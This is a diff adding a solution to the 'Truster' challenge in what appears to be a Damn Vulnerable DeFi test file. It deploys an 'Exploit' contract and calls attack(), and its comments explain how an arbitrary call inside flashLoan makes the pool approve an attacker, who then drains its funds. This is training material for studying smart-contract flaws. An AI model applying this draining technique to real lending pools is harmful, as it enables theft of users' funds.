@@ -23,6 +23,11 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Call flashLoan and the function call is called within the context of the contract.
+        // allows us to get the contract to approve an address and we can transfer funds out of the pool
+        let exploit = await (await ethers.getContractFactory('Exploit', player)).deploy(pool.address);
+        await exploit.connect(player).attack();
     });
 
     after(async function () {
